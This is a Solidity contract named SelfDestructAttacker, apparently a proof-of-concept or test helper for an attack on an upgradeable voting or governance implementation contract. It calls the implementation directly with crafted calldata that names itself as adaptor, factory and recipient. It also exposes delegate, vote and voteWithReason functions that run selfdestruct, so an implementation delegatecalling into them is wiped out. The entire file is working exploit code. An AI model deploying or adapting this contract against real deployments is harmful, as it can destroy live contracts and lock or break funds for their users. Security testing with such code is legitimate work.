// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.23;

contract SelfDestructAttacker {
    function attack(address impl, bytes4 targetSelector) external {
        (bool success, bytes memory returnData) = impl.call(
            abi.encodePacked(
                targetSelector,
                bytes32(0),
                address(this),
                address(this),
                address(this),
                uint40(block.timestamp),
                uint40(block.timestamp + 1),
                uint40(0),
                uint40(1),
                uint16(82)
            )
        );
        if (!success) {
            assembly {
                revert(add(32, returnData), mload(returnData))
            }
        }
    }

    function votingAdaptor() external view returns (address) {
        return address(this);
    }

    function factory() external view returns (address) {
        return address(this);
    }

    function recipient() external view returns (address) {
        return address(this);
    }

    function delegate(bytes calldata) external {
        selfdestruct(payable(address(0)));
    }

    function vote(bytes calldata) external {
        selfdestruct(payable(address(0)));
    }

    function voteWithReason(bytes calldata) external {
        selfdestruct(payable(address(0)));
    }
}
